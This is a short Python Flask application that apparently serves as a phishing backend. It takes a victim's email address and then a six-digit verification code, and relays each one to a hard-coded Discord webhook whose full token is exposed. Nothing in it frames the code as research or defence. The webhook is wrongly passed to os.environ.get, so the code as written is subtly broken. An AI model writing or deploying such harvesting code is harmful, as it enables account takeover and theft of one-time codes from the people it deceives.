from flask import Flask, request, render_template, redirect, url_for
import requests
import os

app = Flask(__name__)

WEBHOOK_URL = os.environ.get("https://discord.com/api/webhooks/1458185599688114309/X9TaZmu-EfBWAHNAv8DLennJgDm2QUYnCeIxxruMIdf9BLqj1CSxRsP09NxOBLr7Sm_u")

@app.route("/", methods=["GET", "POST"])
def email_step():
    if request.method == "POST":
        email = request.form.get("email", "").strip()
        if not email:
            return render_template("email.html", error="Email required")

        requests.post(WEBHOOK_URL, json={
            "content": f"📧 Email submitted:\n{email}"
        })

        return redirect(url_for("code_step"))

    return render_template("email.html")


@app.route("/code", methods=["GET", "POST"])
def code_step():
    if request.method == "POST":
        code = request.form.get("code", "").strip()

        if not code.isdigit() or len(code) != 6:
            return render_template("code.html", error="Invalid code")

        requests.post(WEBHOOK_URL, json={
            "content": f"🔢 Code submitted:\n{code}"
        })

        return render_template("done.html")

    return render_template("code.html")


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
